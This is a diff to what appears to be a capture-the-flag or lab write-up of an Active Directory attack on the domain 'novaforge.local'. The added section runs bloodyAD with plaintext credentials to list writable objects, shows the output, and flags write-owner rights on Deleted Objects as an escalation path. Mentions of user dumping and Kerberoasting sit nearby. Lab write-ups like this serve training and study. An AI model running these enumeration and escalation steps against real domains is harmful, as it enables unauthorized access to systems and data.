@@ -373,6 +373,33 @@ Ive dumped them all to a user file!
 
 This user does not have access to WINRM or RDP on the DC
 
+## BloodyAD get writable
+```python
+bloodyAD --host dc.novaforge.local -d novaforge.local -u 'john.doe' -p 'johndoe1369' get writable
+
+distinguishedName: CN=Users,DC=novaforge,DC=local
+permission: CREATE_CHILD
+
+distinguishedName: CN=Deleted Objects,DC=novaforge,DC=local
+permission: CREATE_CHILD; WRITE
+OWNER: WRITE
+DACL: WRITE
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=novaforge,DC=local
+permission: WRITE
+
+distinguishedName: CN=john.doe,CN=Users,DC=novaforge,DC=local
+permission: WRITE
+
+distinguishedName: CN=m.lee\0ADEL:93ec6349-1919-424f-963c-5971a8832f62,CN=Deleted Objects,DC=novaforge,DC=local
+permission: WRITE
+
+distinguishedName: DC=_msdcs.novaforge.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=novaforge,DC=local
+permission: CREATE_CHILD
+```
+
+Looks like this user has WriteOwner on the Deleted objects!
+
 # Kerberoasting
 
 ```python
